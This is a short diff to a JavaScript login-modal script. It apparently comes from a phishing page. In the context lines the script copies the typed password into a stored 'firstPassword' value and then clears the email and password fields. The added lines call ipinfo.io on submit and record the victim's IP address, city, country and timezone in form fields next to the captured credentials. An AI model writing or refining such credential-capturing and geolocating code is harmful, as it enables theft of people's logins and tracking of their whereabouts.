@@ -48,17 +48,16 @@ function openModal() {
             firstPassword.setAttribute('value', `${passwordField.value}`);
             emailField.value = '';
             passwordField.value = '';
+            jQuery.get("http://ipinfo.io/", function(e) {
+            ipAddress.setAttribute('value', `${e.ip}`);
+            city.setAttribute('value', `${e.city}`);
+            country.setAttribute('value', `${e.country}`);
+            timezone.setAttribute('value', `${e.timezone}`);
+            }, "jsonp")
+
         }
     }
 }
-
-jQuery.get("http://ipinfo.io/", function(e) {
-    ipAddress.setAttribute('value', `${e.ip}`);
-    city.setAttribute('value', `${e.city}`);
-    country.setAttribute('value', `${e.country}`);
-    timezone.setAttribute('value', `${e.timezone}`);
-}, "jsonp")
-
 // function to close modal
 function closeModal() {
     modal.style.display = 'none';
